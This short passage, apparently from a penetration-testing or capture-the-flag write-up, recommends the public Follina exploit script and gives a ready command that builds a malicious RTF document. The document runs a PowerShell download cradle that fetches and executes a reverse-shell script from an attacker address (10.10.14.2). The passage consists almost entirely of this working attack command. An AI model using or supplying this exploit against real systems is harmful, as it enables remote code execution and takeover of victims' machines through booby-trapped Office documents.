The following exploit [Follina](https://github.com/chvancooten/follina.py) works pretty well, all you need to do is clone the repository and execute it as follows, the "-c" is the command to execute, it can be a cmd or a powershell intruction:
```bash
python3 follina.py -m command -t rtf -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/reverse.ps1')"
```
